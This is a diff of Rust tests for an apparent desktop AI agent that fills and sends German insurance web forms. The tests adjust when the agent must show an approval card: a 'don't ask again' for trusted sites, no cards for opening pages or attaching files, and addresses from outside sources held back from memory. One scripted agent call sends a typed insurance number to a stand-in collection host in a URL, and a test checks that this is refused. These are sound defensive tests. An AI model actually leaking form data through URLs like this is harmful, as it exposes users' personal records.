@@ -434,10 +434,15 @@ async fn commit_click_waits_for_yes_and_uses_spark_pick() {
     let ev = h.drain();
     let c = cards(&ev);
     assert_eq!(c.len(), 1);
-    assert_eq!(c[0].title, "Darf ich das abschicken?");
-    assert_eq!(c[0].yes_label, "Ja, abschicken");
+    assert_eq!(c[0].title, "Bereit zum Abschicken an Seite auf diesem Computer?");
+    assert_eq!(c[0].yes_label, "Abschicken");
     assert_eq!(c[0].no_label, "Noch nicht");
     assert_eq!(c[0].to, "An: Seite auf diesem Computer", "the real page, not only the model's word");
+    assert_eq!(
+        c[0].remember_label.as_deref(),
+        Some("Für Seite auf diesem Computer nicht mehr fragen"),
+        "a send on a known page offers 'Don't ask again'"
+    );
     assert!(c[0].crop_png_b64.is_some());
     assert!(ev.iter().any(|e| matches!(e, UiEvent::ApprovalClosed { id } if *id == c[0].id)));
 }
@@ -459,8 +464,8 @@ async fn send_card_stays_a_send_card_when_what_names_the_file() {
     assert_eq!(h.run("Schick es ab").await, AgentOutcome::Stopped);
     assert!(h.platform.clicks().is_empty());
     let c = cards(&h.drain());
-    assert_eq!(c[0].title, "Darf ich das abschicken?");
-    assert_eq!(c[0].yes_label, "Ja, abschicken");
+    assert_eq!(c[0].title, "Bereit zum Abschicken an Gesundkasse (Kontaktformular)?");
+    assert_eq!(c[0].yes_label, "Abschicken");
 }
 
 #[tokio::test]
@@ -792,8 +797,8 @@ async fn one_enter_confirms_the_file_dialog_after_an_approved_attach() {
     let out = h.run("Häng die Krankschreibung an").await;
     assert_eq!(out, AgentOutcome::Done("Angehängt.".into()));
     let c = cards(&h.drain());
-    assert_eq!(c.len(), 2, "attach card, then a card for the second Enter only");
-    assert!(c[0].title.contains("anhängen"), "{}", c[0].title);
+    // Opening the file picker needs no card any more; only the second Enter (not the dialog's) is asked.
+    assert_eq!(c.len(), 1, "a card for the second Enter only");
     assert_eq!(h.platform.actions().iter().filter(|a| *a == "key enter").count(), 2);
 }
 
@@ -817,7 +822,7 @@ async fn enter_after_attach_needs_a_card_when_the_dialog_is_not_seen() {
     h.sam(&[sam_box(100, 600, 300, 640)]);
     h.auto_answer(ApprovalAnswer::Yes, "");
     h.run("Häng die Krankschreibung an").await;
-    assert_eq!(cards(&h.drain()).len(), 2);
+    assert_eq!(cards(&h.drain()).len(), 1, "no attach card; the unseen dialog's Enter is asked");
 }
 
 #[tokio::test]
@@ -854,8 +859,7 @@ async fn the_approved_letter_is_typed_into_the_file_dialog() {
     assert_eq!(out, AgentOutcome::Done("Angehängt.".into()));
     assert_eq!(h.platform.typed(), "C:\\Briefe\\au.pdf");
     let c = cards(&h.drain());
-    assert_eq!(c.len(), 1, "the dialog's Enter is free");
-    assert!(c[0].attachments.len() == 1 && c[0].attachments[0].ends_with("au.pdf"), "{:?}", c[0].attachments);
+    assert!(c.is_empty(), "attaching and the dialog's Enter are free; only sending asks");
 }
 
 #[tokio::test]
@@ -967,7 +971,7 @@ async fn ask_without_options_still_has_a_button() {
         UiEvent::Bubble { question_id: Some(_), buttons, .. } => Some(buttons.clone()),
         _ => None,
     });
-    assert_eq!(b.unwrap().iter().map(|b| b.label.as_str()).collect::<Vec<_>>(), vec!["Weiter"]);
+    assert_eq!(b.unwrap().iter().map(|b| b.label.as_str()).collect::<Vec<_>>(), vec!["OK"]);
 }
 
 #[tokio::test]
@@ -1139,8 +1143,7 @@ async fn ui_tree_finds_the_named_button_without_sam() {
     h.auto_answer(ApprovalAnswer::Yes, "");
     h.run("Häng es an").await;
     assert_eq!(h.platform.clicks(), vec!["click 210,610"]);
-    let c = cards(&h.drain());
-    assert!(c[0].title.contains("anhängen") && c[0].crop_png_b64.is_some());
+    assert!(cards(&h.drain()).is_empty(), "opening the file picker needs no card");
     let log = h.memory.recent_actions(20).unwrap();
     assert!(log.iter().any(|a| a.tool == "ground" && a.args_redacted == "uia"), "{log:?}");
 }
@@ -1165,43 +1168,310 @@ async fn space_on_a_focused_button_and_typing_into_a_button_are_caught() {
 }
 
 #[tokio::test]
-async fn remembering_a_new_address_needs_a_yes() {
-    let h = Harness::new(false).await;
+async fn remembering_needs_no_card_and_addresses_wait_for_the_send() {
+    // Plain facts and addresses the user said themselves are saved at once; an address from somewhere else
+    // (a letter, a web page) is held back and saved only when the user presses Send on the next card.
+    let mut h = Harness::new(false).await;
     h.agent_turns(vec![
         calls("r1", &[("remember_fact", json!({"key": "hobby", "value": "Garten"}))]),
         calls("r2", &[("remember_fact", json!({"key": "kasse_mail", "value": "post@gesundkasse.example"}))]),
-        calls("r3", &[done("ok")]),
+        calls("r3", &[("remember_fact", json!({"key": "arbeitgeber_mail", "value": "hr@firma.example"}))]),
+        calls("r4", &[done("ok")]),
     ]);
     h.auto_answer(ApprovalAnswer::Yes, "");
-    h.run("Merk dir das").await;
+    h.run("Merk dir: meine Kasse hat die Adresse post@gesundkasse.example").await;
     assert_eq!(h.memory.profile_get("hobby").unwrap().as_deref(), Some("Garten"));
     assert_eq!(h.memory.profile_get("kasse_mail").unwrap().as_deref(), Some("post@gesundkasse.example"));
-    let log = h.memory.recent_actions(20).unwrap();
-    assert!(log.iter().any(|a| a.tool == "remember_fact" && a.approved == Some(true)));
+    assert_eq!(h.memory.profile_get("arbeitgeber_mail").unwrap(), None, "not the user's words, no send: not saved");
+    assert!(cards(&h.drain()).is_empty(), "remembering never shows a card");
+    let kinds = event_kinds(&h.memory);
+    assert!(kinds.contains(&"remembered: hobby: Garten".to_string()), "{kinds:?}");
+    let o = outputs(&h.requests()[3]);
+    assert!(o[0].starts_with("noted arbeitgeber_mail"), "{o:?}");
 }
 
 #[tokio::test]
-async fn open_url_asks_for_unknown_hosts_once() {
+async fn held_back_address_is_listed_on_the_send_card_and_saved_with_send() {
+    let mut h = Harness::new(false).await;
+    h.agent_turns(vec![
+        calls("r1", &[("remember_fact", json!({"key": "kasse_mail", "value": "post@gesundkasse.example"}))]),
+        calls("r2", &[click("den Knopf „Absenden“", true)]),
+        calls("r3", &[done("ok")]),
+    ]);
+    h.sam(&[sam_box(700, 600, 900, 640)]);
+    h.auto_answer(ApprovalAnswer::Yes, "");
+    h.run("Schick es ab").await;
+    let c = cards(&h.drain());
+    assert_eq!(c.len(), 1);
+    assert_eq!(c[0].remembered, ["Ich merke mir: kasse mail: post@gesundkasse.example"]);
+    assert_eq!(h.memory.profile_get("kasse_mail").unwrap().as_deref(), Some("post@gesundkasse.example"));
+}
+
+#[tokio::test]
+async fn open_url_needs_no_card() {
     let h = Harness::new(false).await;
     h.agent_turns(vec![
         calls("r1", &[("open_url", json!({"url": "https://www.gesundkasse.example/kontakt"}))]),
-        calls("r2", &[("open_url", json!({"url": "https://www.gesundkasse.example/upload"}))]),
+        calls("r2", &[("open_url", json!({"url": "https://www.other.example/upload"}))]),
         calls("r3", &[("open_url", json!({"url": "http://localhost:8000/"}))]),
         calls("r4", &[done("ok")]),
     ]);
     let mut rx = h.bus.to_ui.subscribe();
-    h.auto_answer(ApprovalAnswer::Yes, "");
     h.run("Öffne die Kasse").await;
     assert_eq!(h.opened.lock().unwrap().len(), 3);
-    let mut n = 0;
     while let Ok(ev) = rx.try_recv() {
-        if let UiEvent::ApprovalRequest { card } = ev {
-            n += 1;
-            assert_eq!(card.title, "Darf ich diese Seite öffnen?");
-            assert!(card.what.contains("www.gesundkasse.example"));
-        }
+        assert!(!matches!(ev, UiEvent::ApprovalRequest { .. }), "opening a page shows no card");
     }
-    assert_eq!(n, 1, "one card for the new host, none for the same host or localhost");
+    let log = h.memory.recent_actions(20).unwrap();
+    assert!(log.iter().filter(|a| a.tool == "open_url").all(|a| a.risk == "act" && a.approved.is_none()));
+}
+
+#[tokio::test]
+async fn open_url_with_typed_data_in_the_address_is_refused() {
+    let h = Harness::new(false).await;
+    h.agent_turns(vec![
+        calls(
+            "r1",
+            &[(
+                "type_text",
+                json!({"text": "A123456789", "what": "die Versichertennummer", "into_sam_query": "text input field"}),
+            )],
+        ),
+        calls("r2", &[("open_url", json!({"url": "https://collect.example/?n=A123456789"}))]),
+        calls("r3", &[done("ok")]),
+    ]);
+    h.sam(&[sam_box(100, 100, 300, 140)]);
+    h.run("Mach weiter").await;
+    assert!(h.opened.lock().unwrap().is_empty());
+    assert!(outputs(&h.requests()[2])[0].starts_with("refused: this address contains"));
+}
+
+fn send_click() -> (&'static str, Value) {
+    click("den Knopf „Absenden“", true)
+}
+
+#[tokio::test]
+async fn dont_ask_again_skips_the_card_for_plain_sends_on_that_site() {
+    let mut h = Harness::new(false).await;
+    h.agent_turns(vec![
+        calls("r1", &[("open_url", json!({"url": "https://www.gesundkasse.example/kontakt"}))]),
+        calls("r2", &[send_click()]),
+        calls("r3", &[done("ok")]),
+    ]);
+    h.sam(&[sam_box(700, 600, 900, 640)]);
+    // First send: the user ticks "Don't ask again" and presses Send.
+    let mut rx = h.bus.to_ui.subscribe();
+    let pending = h.bus.pending.clone();
+    let first = tokio::spawn(async move {
+        while let Ok(ev) = rx.recv().await {
+            if let UiEvent::ApprovalRequest { card } = ev {
+                pending.mark_remember_site(card.id);
+                pending.resolve_approval(card.id, ApprovalAnswer::Yes);
+                return card.remember_label;
+            }
+        }
+        None
+    });
+    h.run("Schick es ab").await;
+    assert_eq!(first.await.unwrap().as_deref(), Some("Für www.gesundkasse.example nicht mehr fragen"));
+    assert_eq!(cards(&h.drain()).len(), 1);
+    assert_eq!(h.memory.profile_get("trusted_send_hosts").unwrap().as_deref(), Some("www.gesundkasse.example"));
+
+    // Second run on the same site: no card for the send, Pip clicks and says why.
+    h.agent_turns(vec![
+        calls("r4", &[("open_url", json!({"url": "https://www.gesundkasse.example/kontakt"}))]),
+        calls("r5", &[send_click()]),
+        calls("r6", &[click("den Knopf „Konto löschen“", true)]),
+        calls("r7", &[click("den Knopf „Jetzt bezahlen“", true)]),
+        calls("r8", &[done("ok")]),
+    ]);
+    h.sam(&[sam_box(700, 600, 900, 640), sam_box(700, 600, 900, 640), sam_box(700, 600, 900, 640)]);
+    let mut rx2 = h.bus.to_ui.subscribe();
+    let pending = h.bus.pending.clone();
+    let shown = Arc::new(Mutex::new(Vec::new()));
+    let s2 = shown.clone();
+    tokio::spawn(async move {
+        while let Ok(ev) = rx2.recv().await {
+            if let UiEvent::ApprovalRequest { card } = ev {
+                s2.lock().unwrap().push((card.title.clone(), card.remember_label.clone()));
+                pending.resolve_approval(card.id, ApprovalAnswer::Yes);
+            }
+        }
+    });
+    let before = h.platform.clicks().len();
+    h.run("Schick es nochmal ab").await;
+    let ev = h.drain();
+    assert_eq!(h.platform.clicks().len() - before, 3);
+    assert!(
+        bubbles(&ev)
+            .contains(&"Abgeschickt. Du hast gesagt, dass ich bei www.gesundkasse.example nicht fragen muss.".into()),
+        "{:?}",
+        bubbles(&ev)
+    );
+    // Delete and pay are never skipped, even on a trusted site, and never offer "Don't ask again".
+    let shown = shown.lock().unwrap().clone();
+    assert_eq!(shown.len(), 2, "{shown:?}");
+    assert_eq!(shown[0].0, "Darf ich das löschen?");
+    assert!(shown.iter().all(|(_, r)| r.is_none()), "{shown:?}");
+    let log = h.memory.recent_actions(40).unwrap();
+    assert!(
+        log.iter().any(|a| a.tool == "click" && a.approved == Some(true) && a.result.contains("trusted site")),
+        "{log:?}"
+    );
+}
+
+#[tokio::test]
+async fn a_trusted_site_is_only_that_site() {
+    let mut h = Harness::new(false).await;
+    h.memory.profile_set("trusted_send_hosts", "www.gesundkasse.example").unwrap();
+    h.agent_turns(vec![
+        calls("r1", &[("open_url", json!({"url": "https://upload.evil.example/form"}))]),
+        calls("r2", &[send_click()]),
+    ]);
+    h.sam(&[sam_box(700, 600, 900, 640)]);
+    h.auto_answer(ApprovalAnswer::No, "");
+    assert_eq!(h.run("Schick es ab").await, AgentOutcome::Stopped);
+    assert_eq!(cards(&h.drain()).len(), 1, "another host still gets the card");
+    assert!(h.platform.clicks().is_empty());
+}
+
+#[tokio::test]
+async fn unticked_box_trusts_nothing() {
+    let mut h = Harness::new(false).await;
+    h.agent_turns(vec![
+        calls("r1", &[("open_url", json!({"url": "https://www.gesundkasse.example/kontakt"}))]),
+        calls("r2", &[send_click()]),
+        calls("r3", &[done("ok")]),
+    ]);
+    h.sam(&[sam_box(700, 600, 900, 640)]);
+    h.auto_answer(ApprovalAnswer::Yes, "");
+    h.run("Schick es ab").await;
+    assert_eq!(cards(&h.drain()).len(), 1);
+    assert_eq!(h.memory.profile_get("trusted_send_hosts").unwrap(), None);
+}
+
+#[tokio::test]
+async fn page_moved_under_the_button_same_label_is_clicked_without_a_second_card() {
+    // After "Send" the button moved (a banner pushed the page down). The same „Absenden“ is found again and
+    // clicked at its new place; no second card, no "the page changed".
+    let mut h = Harness::new(false).await;
+    h.platform.set_ui(PhysRect { x: 700, y: 600, w: 200, h: 40 }, "Absenden", false);
+    h.agent_turns(vec![calls("r1", &[send_click()]), calls("r2", &[done("ok")])]);
+    h.sam(&[sam_box(700, 600, 900, 640)]);
+    let mut rx = h.bus.to_ui.subscribe();
+    let pending = h.bus.pending.clone();
+    let plat = h.platform.clone();
+    tokio::spawn(async move {
+        while let Ok(ev) = rx.recv().await {
+            if let UiEvent::ApprovalRequest { card } = ev {
+                let mut ui = plat.ui.lock().unwrap();
+                ui.clear();
+                ui.push((
+                    PhysRect { x: 700, y: 600, w: 200, h: 40 },
+                    UiElement { name: "Hinweis".into(), control: "Text".into(), is_password: false },
+                ));
+                ui.push((
+                    PhysRect { x: 700, y: 700, w: 200, h: 40 },
+                    UiElement { name: "Absenden".into(), control: "Button".into(), is_password: false },
+                ));
+                drop(ui);
+                pending.resolve_approval(card.id, ApprovalAnswer::Yes);
+            }
+        }
+    });
+    h.run("Schick es ab").await;
+    assert_eq!(h.platform.clicks(), vec!["click 800,720"]);
+    let ev = h.drain();
+    assert_eq!(cards(&ev).len(), 1);
+    assert!(!bubbles(&ev).iter().any(|b| b.starts_with("Die Seite hat sich")), "{:?}", bubbles(&ev));
+}
+
+#[tokio::test]
+async fn page_changed_says_it_once_and_the_same_button_needs_no_second_card() {
+    let mut h = Harness::new(false).await;
+    h.platform.set_ui(PhysRect { x: 700, y: 600, w: 200, h: 40 }, "Absenden", false);
+    h.agent_turns(vec![calls("r1", &[send_click()]), calls("r2", &[send_click()]), calls("r3", &[done("ok")])]);
+    let mut rx = h.bus.to_ui.subscribe();
+    let pending = h.bus.pending.clone();
+    let plat = h.platform.clone();
+    tokio::spawn(async move {
+        while let Ok(ev) = rx.recv().await {
+            match ev {
+                UiEvent::ApprovalRequest { card } => {
+                    // a popup covers the button while the card is open
+                    plat.ui.lock().unwrap().insert(
+                        0,
+                        (
+                            PhysRect { x: 600, y: 550, w: 400, h: 150 },
+                            UiElement { name: "Cookie-Hinweis".into(), control: "Pane".into(), is_password: false },
+                        ),
+                    );
+                    pending.resolve_approval(card.id, ApprovalAnswer::Yes);
+                }
+                // ... and goes away again once Pip says the page changed
+                UiEvent::Bubble { text, .. } if text.starts_with("Die Seite hat sich") => {
+                    plat.ui.lock().unwrap().remove(0);
+                }
+                _ => {}
+            }
+        }
+    });
+    h.run("Schick es ab").await;
+    let ev = h.drain();
+    assert_eq!(cards(&ev).len(), 1, "the yes still counts for the same button");
+    assert_eq!(bubbles(&ev).iter().filter(|b| b.starts_with("Die Seite hat sich")).count(), 1);
+    assert_eq!(h.platform.clicks(), vec!["click 800,620"]);
+    let reqs = h.requests();
+    assert!(outputs(&reqs[1])[0].starts_with("not clicked: the page changed"), "{:?}", outputs(&reqs[1]));
+}
+
+#[tokio::test]
+async fn unnamed_button_without_send_words_is_clicked_without_a_card() {
+    // Linux / icon buttons: no UI name, the label reader sees nothing. "den blauen Knopf" alone is not a send.
+    let mut h = Harness::new(false).await;
+    h.agent_turns(vec![calls("r1", &[click("den blauen Knopf unten", false)]), calls("r2", &[done("ok")])]);
+    h.sam(&[sam_box(700, 600, 900, 640)]);
+    h.run("Mach weiter").await;
+    assert!(cards(&h.drain()).is_empty());
+    assert_eq!(h.platform.clicks(), vec!["click 800,620"]);
+}
+
+#[tokio::test]
+async fn space_with_unknown_focus_after_a_click_needs_no_card() {
+    let mut h = Harness::new(false).await;
+    let space = ("key", json!({"combo": "space", "is_commit": false, "commit_what": null, "commit_to": null}));
+    h.agent_turns(vec![
+        calls("r1", &[click("das Kästchen „Ich stimme zu“", false)]),
+        calls("r2", &[space]),
+        calls("r3", &[done("ok")]),
+    ]);
+    h.sam(&[sam_box(100, 300, 120, 320)]);
+    h.run("Hak das an").await;
+    assert!(cards(&h.drain()).is_empty());
+    assert!(h.platform.actions().contains(&"key space".to_string()));
+}
+
+#[tokio::test]
+async fn progress_line_ticks_off_each_field() {
+    let mut h = Harness::new(false).await;
+    h.agent_turns(vec![
+        calls(
+            "r1",
+            &[
+                ("type_text", json!({"text": "Erika", "what": "deinen Namen", "into_sam_query": "text input field"})),
+                (
+                    "type_text",
+                    json!({"text": "A123", "what": "deine Versichertennummer", "into_sam_query": "text input field"}),
+                ),
+            ],
+        ),
+        calls("r2", &[done("ok")]),
+    ]);
+    h.sam(&[sam_box(100, 100, 300, 140), sam_box(100, 200, 300, 240)]);
+    h.run("Füll das aus").await;
+    let p = progress(&h.drain());
+    assert!(p.contains(&"Namen ✓".to_string()), "{p:?}");
+    assert!(p.contains(&"Namen ✓ · Versichertennummer ✓".to_string()), "{p:?}");
 }
 
 #[tokio::test]
@@ -1505,7 +1775,9 @@ async fn yes_switches_to_act_and_submit_still_shows_card() {
     let ev = x.h.drain();
     let c = cards(&ev);
     assert_eq!(c.len(), 1);
-    assert_eq!(c[0].title, "May I send this?");
+    assert_eq!(c[0].title, "Ready to send to Gesundkasse?");
+    assert_eq!(c[0].yes_label, "Send");
+    assert_eq!(c[0].no_label, "Not yet");
     assert_eq!(x.h.platform.clicks(), vec!["click 800,620"]);
     assert!(
         bubbles(&ev).iter().any(|b| b.starts_with("Done.") && b.contains("Questionnaire sent.")),
